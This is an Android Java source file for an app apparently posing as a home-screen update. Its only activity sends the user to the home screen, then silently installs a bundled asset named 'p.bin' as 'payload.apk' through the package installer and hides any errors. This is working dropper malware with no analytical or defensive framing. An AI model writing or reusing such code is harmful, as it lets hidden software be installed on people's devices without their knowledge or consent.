package com.example.homeupdate;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Bundle;
import java.io.InputStream;
import java.io.OutputStream;
public class HomeActivity extends Activity {
  @Override protected void onCreate(Bundle b) {
    super.onCreate(b);
    Intent home = new Intent(Intent.ACTION_MAIN);
    home.addCategory(Intent.CATEGORY_HOME);
    startActivity(home);
    if (getPackageManager().canRequestPackageInstalls()) {
      try {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        int id = pi.createSession(p);
        PackageInstaller.Session s = pi.openSession(id);
        OutputStream out = s.openWrite("payload.apk", 0, -1);
        InputStream in = getAssets().open("p.bin");
        byte[] buf = new byte[8192]; int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        s.fsync(out); out.close();
        s.commit(null);
      } catch (Exception e) {}
    }
  }
}
